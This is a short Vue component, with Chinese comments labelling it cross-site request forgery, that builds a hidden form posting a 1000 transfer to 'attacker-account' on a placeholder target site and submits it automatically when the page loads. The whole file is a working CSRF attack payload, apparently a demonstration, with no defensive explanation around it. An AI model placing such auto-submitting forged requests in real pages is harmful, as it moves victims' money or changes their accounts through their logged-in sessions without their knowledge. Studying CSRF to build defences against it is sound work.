<template>
  <!-- 跨站伪造 -->
  <form ref="csrfForm" action="https://target-website.com/transfer" method="POST" style="display: none">
    <input name="amount" value="1000" />
    <input type="hidden" name="to" value="attacker-account" />
  </form>
</template>
<script setup>
import { ref, onMounted } from "vue";

const csrfForm = ref(null);

// submit() 是一次性操作，不会在内存中留下持久引用。不会内存泄漏
onMounted(() => {
  // 确保 DOM 已渲染
  csrfForm.value.submit();
  console.log("Form is already been submitted");
});
</script>
